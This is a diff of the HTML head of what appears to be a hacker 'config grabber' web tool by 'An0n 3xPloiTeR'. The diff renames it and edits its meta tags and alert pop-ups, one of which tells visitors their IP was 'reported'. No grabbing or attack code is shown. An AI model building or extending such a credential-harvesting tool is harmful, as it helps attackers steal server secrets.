@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <title>An0n 3xPloiTeR C0nfIG FucK3R</title>
+        <title>An0n 3xPloiTeR C0nfIG Gr4bb3r</title>
         <link rel='SHORTCUT ICON' href='http://i66.tinypic.com/2j33a85.jpg' />
         <meta charset="UTF-8" />
-        <meta name="description" content="An0n 3xPloiTeR C0nfIG FucK3R" />
-        <meta name="location" content="An0n 3xPloiTeR C0nfIG FucK3R" />
+        <meta name="description" content="An0n 3xPloiTeR C0nfIG Gr4bb3r" />
+        <meta name="location" content="An0n 3xPloiTeR C0nfIG Gr4bb3r" />
         <meta http-equiv="refresh" content="3600"><!-- For Refreshing Page After 3600 Intervals of time -->
-        <meta name="working" content="An0n 3xPloiTeR C0nfIG FucK3R" />
-        <meta name="about" content="An0n 3xPloiTeR C0nfIG FucK3R" />
+        <meta name="working" content="An0n 3xPloiTeR C0nfIG Gr4bb3r" />
+        <meta name="about" content="An0n 3xPloiTeR C0nfIG Gr4bb3r" />
         <meta name="author" content="An0n 3xPloiTeR, Umar Arfeen Shah" />
-        <meta name="keywords" content="An0n, 3xPloiTeR, C0NFIG, FUCK3R, An0n 3xPloiTeR C0nfIG FucK3R" />
+        <meta name="keywords" content="An0n, 3xPloiTeR, C0NFIG, Gr4bb3r, An0n 3xPloiTeR C0nfIG Gr4bb3r" />
         <meta name="revisit-after" content="1200" />
         <meta name="language" content="en" />
         <meta name='rating' content='general' />
@@ -24,7 +24,7 @@
         <meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
         <script language='JavaScript1.2'>
             function ejs_nodroit(){
-                alert ('An0n 3xPloiTeR C0nfIG FucK3R');
+                alert ('An0n 3xPloiTeR C0nfIG Gr4bb3r');
                 alert ('Made By An0n 3xPloiTeR');
                 alert ('Although There Are No Copyrights But You Aren\'t Supposed To Copy My Code :\'(');
                 alert ('Got Your Ip: <?php $ip_address = $_SERVER["REMOTE_ADDR"]; echo $ip_address; ?> And Reported To An0n 3xPloiTeR :-)');
